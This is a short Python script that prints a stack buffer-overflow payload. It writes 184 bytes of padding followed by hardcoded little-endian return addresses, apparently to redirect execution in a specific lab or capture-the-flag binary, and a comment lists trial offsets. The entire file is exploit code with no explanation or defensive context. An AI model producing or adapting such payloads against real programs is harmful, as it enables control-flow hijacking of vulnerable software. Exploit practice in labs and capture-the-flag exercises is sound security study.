import sys
# trial = [64 68 72 76 80]
padding = b'A'*184
padding2 = b'A'*8
exit_add = (0x10e14).to_bytes(8,'little')
address = (0x104e8).to_bytes(8, 'little')


sys.stdout.buffer.write(padding + address + padding + exit_add)
sys.stdout.buffer.flush()